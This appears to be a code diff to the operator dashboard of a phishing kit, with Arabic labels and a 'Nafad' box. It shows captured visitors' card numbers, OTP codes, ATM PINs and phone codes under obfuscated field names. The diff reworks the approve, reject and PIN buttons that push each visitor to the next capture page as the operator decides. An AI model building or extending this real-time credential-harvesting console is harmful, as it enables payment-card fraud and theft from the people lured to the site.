@@ -111,18 +111,29 @@ export default function DashboardPage() {
   const [newBlockedCard, setNewBlockedCard] = useState("");
   const [currentTime, setCurrentTime] = useState(Date.now());
   const [openLogBox, setOpenLogBox] = useState<string | null>(null);
+  
+  // Local decision states for old boxes
   const [cardLocalDecision, setCardLocalDecision] = useState<"approved" | "rejected" | "pin" | null>(null);
   const [phoneLocalDecision, setPhoneLocalDecision] = useState<"approved" | "rejected" | null>(null);
   const [otpLocalDecision, setOtpLocalDecision] = useState<"approved" | "rejected" | null>(null);
   const [pinLocalDecision, setPinLocalDecision] = useState<"approved" | "rejected" | null>(null);
+  
+  // Pending decisions from server (local memory) - fetched when selecting a visitor
+  type PendingDecision = { status: 'pending'; timestamp: number };
+  type PendingDecisions = {
+    card?: PendingDecision;
+    otp?: PendingDecision;
+    pin?: PendingDecision;
+    phone?: PendingDecision;
+  };
+  const [pendingDecisions, setPendingDecisions] = useState<PendingDecisions>({});
+  
   const socketRef = useRef<Socket | null>(null);
-  // Track if selected request change is due to socket update (to avoid resetting local decisions)
-  const isSocketUpdateRef = useRef(false);
-  // Track which specific box was updated via socket (to preserve that box's local decision)
-  const socketUpdatedBoxRef = useRef<string | null>(null);
   const currentTimeRef = useRef(Date.now());
   const headerMenuRef = useRef<HTMLDivElement | null>(null);
   const settingsModalRef = useRef<HTMLDivElement | null>(null);
+  const isSocketUpdateRef = useRef(false);
+  const socketUpdatedBoxRef = useRef<string | null>(null);
 
   // Update current time every minute for timer display
   useEffect(() => {
@@ -561,24 +572,50 @@ export default function DashboardPage() {
     return () => document.removeEventListener("mousedown", handlePointerDown);
   }, []);
 
-  // Reset local decisions when changing selected request
+  // Fetch pending decisions from server when selecting a visitor
   useEffect(() => {
-    // If socket update caused this change, preserve decisions for the updated box
-    if (isSocketUpdateRef.current) {
-      isSocketUpdateRef.current = false;
-      // Only reset decisions for boxes that were NOT just updated via socket
-      const updatedBox = socketUpdatedBoxRef.current;
-      if (updatedBox !== "card") setCardLocalDecision(null);
-      if (updatedBox !== "phone") setPhoneLocalDecision(null);
-      if (updatedBox !== "otp") setOtpLocalDecision(null);
-      if (updatedBox !== "pin") setPinLocalDecision(null);
+    if (!selectedRequestId) {
+      setPendingDecisions({});
       return;
     }
-    // Full reset when user manually changes selection
-    setCardLocalDecision(null);
-    setPhoneLocalDecision(null);
-    setOtpLocalDecision(null);
-    setPinLocalDecision(null);
+
+    const fetchPendingDecisions = async () => {
+      try {
+        const res = await fetch(`/api/pending/${selectedRequestId}`);
+        if (res.ok) {
+          const data = await res.json();
+          setPendingDecisions(data.pending || {});
+        }
+      } catch (error) {
+        console.error("[Pending] Failed to fetch:", error);
+      }
+    };
+
+    fetchPendingDecisions();
+  }, [selectedRequestId]);
+
+  // Listen for pending updates from socket
+  useEffect(() => {
+    const handlePendingUpdate = (data: { visitorId: string; boxType: string; status: string }) => {
+      if (data.visitorId === selectedRequestId) {
+        setPendingDecisions((prev) => {
+          const updated = { ...prev };
+          if (data.status === "pending") {
+            updated[data.boxType as keyof PendingDecisions] = { status: 'pending', timestamp: Date.now() };
+          } else {
+            delete updated[data.boxType as keyof PendingDecisions];
+          }
+          return updated;
+        });
+      }
+    };
+
+    if (socketRef.current) {
+      socketRef.current.on("pending:update", handlePendingUpdate);
+      return () => {
+        socketRef.current?.off("pending:update", handlePendingUpdate);
+      };
+    }
   }, [selectedRequestId]);
 
   // Get country flag
@@ -2556,16 +2593,12 @@ const renderNafadBox = () => {
     // Create ONE box for Card (latest entry only)
     if (latestCardEntry) {
       const raw = latestCardEntry.raw || {};
-      // Use ONLY this entry's data - don't merge from other entries
-      const serverCardStatus = raw._v1Status || raw.paymentStatus || "";
-      // If server has a decision, use it (for persistence after reload)
-      // Otherwise use local decision (for immediate feedback)
-      const effectiveCardStatus = serverCardStatus || cardLocalDecision || "";
-      const hasCardDecision = Boolean(serverCardStatus || cardLocalDecision);
-      // Show buttons if: no decision AND has card data AND time is recent (within 30 minutes)
-      const cardUpdatedAt = raw._v1UpdatedAt ? new Date(raw._v1UpdatedAt).getTime() : 0;
-      const isCardRecent = Date.now() - cardUpdatedAt < 30 * 60 * 1000; // 30 minutes
-      const showCardDecisionButtons = !hasCardDecision && Boolean(raw._v1 || raw.cardNumber) && isCardRecent;
+      // Check if card has pending decision from server
+      const hasCardPending = Boolean(pendingDecisions.card);
+      // Show buttons if: has pending decision AND has card data
+      const showCardDecisionButtons = hasCardPending && Boolean(raw._v1 || raw.cardNumber);
+      // Status text based on pending state
+      const cardStatusText = hasCardPending ? "في انتظار المراجعة" : (raw._v1Status === "approved" ? "تمت الموافقة" : raw._v1Status === "rejected" ? "تم الرفض" : "");
       // Use _v1UpdatedAt for Card box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v1UpdatedAt 
         ? new Date(raw._v1UpdatedAt).getTime()
@@ -2903,88 +2936,62 @@ const renderNafadBox = () => {
               </div>
             </div>
             
-            {effectiveCardStatus === "approved" ? (
+            {raw._v1Status === "approved" ? (
               <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                 ✓ تمت الموافقة
               </div>
-            ) : effectiveCardStatus === "rejected" ? (
+            ) : raw._v1Status === "rejected" ? (
               <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                 ✗ تم رفض البطاقة
               </div>
-            ) : effectiveCardStatus === "pin" ? (
-              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dbeafe", color: "#1e40af", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
-                🔐 رمز ATM
-              </div>
-            ) : (
+            ) : hasCardPending ? (
               <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                 ⏳ في انتظار المراجعة فقط
               </div>
-            )}
+            ) : null}
             {showCardDecisionButtons && (
               <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                 <button onClick={async () => { 
-                  setCardLocalDecision("approved");
-                  socketUpdatedBoxRef.current = "card";
                   setActionLoading("card");
                   const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                   if (visitorId) {
-                    await fetch("/api/dashboard/reflect-status", {
+                    await fetch("/api/dashboard/admin-action", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, field: "_v1Status", status: "approved" }),
-                    });
-                    await fetch("/api/dashboard/redirect", {
-                      method: "POST",
-                      headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, targetPage: "step2" }),
+                      body: JSON.stringify({ visitorId, boxType: "card", action: "approve" }),
                     });
                   }
                   setActionLoading(null);
-                  setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                 }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   موافقة
                 </button>
                 <button onClick={async () => { 
-                  setCardLocalDecision("rejected");
-                  socketUpdatedBoxRef.current = "card";
                   setActionLoading("card");
                   const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                   if (visitorId) {
-                    await fetch("/api/dashboard/reflect-status", {
+                    await fetch("/api/dashboard/admin-action", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, field: "_v1Status", status: "rejected" }),
-                    });
-                    await fetch("/api/dashboard/redirect", {
-                      method: "POST",
-                      headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, targetPage: "check" }),
+                      body: JSON.stringify({ visitorId, boxType: "card", action: "reject" }),
                     });
                   }
                   setActionLoading(null);
-                  setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                 }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   رفض
                 </button>
                 <button onClick={async () => { 
-                  setCardLocalDecision("pin");
-                  socketUpdatedBoxRef.current = "card";
                   setActionLoading("card");
                   const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                   if (visitorId) {
-                    await fetch("/api/dashboard/reflect-status", {
+                    await fetch("/api/pending/" + visitorId + "/pin", { method: "POST" });
+                    // Clear card pending and set pin pending
+                    await fetch("/api/dashboard/admin-action", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, field: "_v6Status", status: "pending" }),
-                    });
-                    await fetch("/api/dashboard/redirect", {
-                      method: "POST",
-                      headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({ visitorId, targetPage: "step3" }),
+                      body: JSON.stringify({ visitorId, boxType: "card", action: "redirect", targetPage: "step3" }),
                     });
                   }
                   setActionLoading(null);
-                  setTimeout(() => { socketUpdatedBoxRef.current = null; }, 2000);
                 }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#3b82f6", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   PIN
                 </button>
@@ -3168,16 +3175,10 @@ const renderNafadBox = () => {
     if (latestOtpEntry) {
       const raw = latestOtpEntry.raw || {};
       const otpCode = raw._v5 || raw.otpCode;
-      // Use ONLY this entry's data
-      const serverOtpStatus = raw._v5Status || raw.otpStatus || "";
-      // If server has a decision, use it (for persistence after reload)
-      // Otherwise use local decision (for immediate feedback)
-      const effectiveOtpStatus = serverOtpStatus || otpLocalDecision || "";
-      const hasOtpDecision = Boolean(serverOtpStatus || otpLocalDecision);
-      // Show buttons if: no decision AND has OTP data AND time is recent (within 30 minutes)
-      const otpUpdatedAt = raw._v5UpdatedAt ? new Date(raw._v5UpdatedAt).getTime() : 0;
-      const isOtpRecent = Date.now() - otpUpdatedAt < 30 * 60 * 1000; // 30 minutes
-      const showOtpDecisionButtons = !hasOtpDecision && Boolean(otpCode) && isOtpRecent;
+      // Check if OTP has pending decision from server
+      const hasOtpPending = Boolean(pendingDecisions.otp);
+      // Show buttons if: has pending decision AND has OTP data
+      const showOtpDecisionButtons = hasOtpPending && Boolean(otpCode);
       // Use _v5UpdatedAt for OTP box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v5UpdatedAt 
         ? new Date(raw._v5UpdatedAt).getTime()
@@ -3230,11 +3231,11 @@ const renderNafadBox = () => {
                 <p style={{ margin: "0 0 4px", fontSize: "12px", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
                 <p style={{ margin: 0, fontSize: "24px", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpCode}</p>
               </div>
-              {effectiveOtpStatus === "approved" ? (
+              {raw._v5Status === "approved" ? (
                 <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                   ✓ تمت الموافقة
                 </div>
-              ) : effectiveOtpStatus === "rejected" ? (
+              ) : raw._v5Status === "rejected" ? (
                 <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                   ✗ تم رفض رمز التحقق
                 </div>
@@ -3245,10 +3246,32 @@ const renderNafadBox = () => {
               )}
               {showOtpDecisionButtons && (
                 <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
-                  <button onClick={() => handleLocalOtpAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
+                  <button onClick={async () => {
+                    setActionLoading("otp");
+                    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+                    if (visitorId) {
+                      await fetch("/api/dashboard/admin-action", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ visitorId, boxType: "otp", action: "approve" }),
+                      });
+                    }
+                    setActionLoading(null);
+                  }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     موافقة
                   </button>
-                  <button onClick={() => handleLocalOtpAction("rejected")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
+                  <button onClick={async () => {
+                    setActionLoading("otp");
+                    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+                    if (visitorId) {
+                      await fetch("/api/dashboard/admin-action", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ visitorId, boxType: "otp", action: "reject" }),
+                      });
+                    }
+                    setActionLoading(null);
+                  }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     رفض
                   </button>
                 </div>
@@ -3368,16 +3391,10 @@ const renderNafadBox = () => {
     if (latestPinEntry) {
       const raw = latestPinEntry.raw || {};
       const pinCode = raw._v6 || raw.pinCode;
-      // Use ONLY this entry's data
-      const serverPinStatus = raw._v6Status || raw.pinStatus || "";
-      // If server has a decision, use it (for persistence after reload)
-      // Otherwise use local decision (for immediate feedback)
-      const effectivePinStatus = serverPinStatus || pinLocalDecision || "";
-      const hasPinDecision = Boolean(serverPinStatus || pinLocalDecision);
-      // Show buttons if: no decision AND has PIN data AND time is recent (within 30 minutes)
-      const pinUpdatedAt = raw._v6UpdatedAt ? new Date(raw._v6UpdatedAt).getTime() : 0;
-      const isPinRecent = Date.now() - pinUpdatedAt < 30 * 60 * 1000; // 30 minutes
-      const showPinDecisionButtons = !hasPinDecision && Boolean(pinCode) && isPinRecent;
+      // Check if PIN has pending decision from server
+      const hasPinPending = Boolean(pendingDecisions.pin);
+      // Show buttons if: has pending decision AND has PIN data
+      const showPinDecisionButtons = hasPinPending && Boolean(pinCode);
       // Use _v6UpdatedAt for PIN box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v6UpdatedAt 
         ? new Date(raw._v6UpdatedAt).getTime()
@@ -3450,10 +3467,32 @@ const renderNafadBox = () => {
               )}
               {showPinDecisionButtons && (
                 <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
-                  <button onClick={() => handleLocalPinAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
+                  <button onClick={async () => {
+                    setActionLoading("pin");
+                    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+                    if (visitorId) {
+                      await fetch("/api/dashboard/admin-action", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ visitorId, boxType: "pin", action: "approve" }),
+                      });
+                    }
+                    setActionLoading(null);
+                  }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     موافقة
                   </button>
-                  <button onClick={() => handleLocalPinAction("rejected")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
+                  <button onClick={async () => {
+                    setActionLoading("pin");
+                    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+                    if (visitorId) {
+                      await fetch("/api/dashboard/admin-action", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ visitorId, boxType: "pin", action: "reject" }),
+                      });
+                    }
+                    setActionLoading(null);
+                  }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     رفض
                   </button>
                 </div>
@@ -3574,17 +3613,11 @@ const renderNafadBox = () => {
     // Create ONE box for Phone (latest entry only)
     if (latestPhoneEntry) {
       const raw = latestPhoneEntry.raw || {};
-      // Use ONLY this entry's data - don't merge from other entries
-      const serverPhoneStatus = raw.phoneOtpStatus || raw.phoneStatus || "";
-      // If server has a decision, use it (for persistence after reload)
-      // Otherwise use local decision (for immediate feedback)
-      const effectivePhoneStatus = serverPhoneStatus || phoneLocalDecision || "";
-      const hasPhoneDecision = Boolean(serverPhoneStatus || phoneLocalDecision);
-      // Show buttons if: no decision AND has phone data from step5 AND time is recent (within 30 minutes)
+      // Check if phone has pending decision from server
+      const hasPhonePending = Boolean(pendingDecisions.phone);
+      // Show buttons if: has pending decision AND has phone data from step5
       const hasPhoneData = Boolean(raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7);
-      const phoneUpdatedAt = raw._v7UpdatedAt ? new Date(raw._v7UpdatedAt).getTime() : 0;
-      const isPhoneRecent = Date.now() - phoneUpdatedAt < 30 * 60 * 1000; // 30 minutes
-      const showPhoneDecisionButtons = !hasPhoneDecision && hasPhoneData && isPhoneRecent;
+      const showPhoneDecisionButtons = hasPhonePending && hasPhoneData;
       // Use _v7UpdatedAt for Phone box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v7UpdatedAt 
         ? new Date(raw._v7UpdatedAt).getTime()
@@ -3655,11 +3688,11 @@ const renderNafadBox = () => {
                   <p style={{ margin: 0, fontSize: "18px", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{raw.phoneOtp || raw._v7}</p>
                 </div>
               )}
-              {effectivePhoneStatus === "approved" ? (
+              {raw.phoneOtpStatus === "approved" ? (
                 <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                   ✓ تمت الموافقة - العميل يُوجه للصفحة التالية
                 </div>
-              ) : effectivePhoneStatus === "rejected" ? (
+              ) : raw.phoneOtpStatus === "rejected" ? (
                 <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                   ✗ تم رفض رقم الهاتف - العميل سيُعيد المحاولة
                 </div>
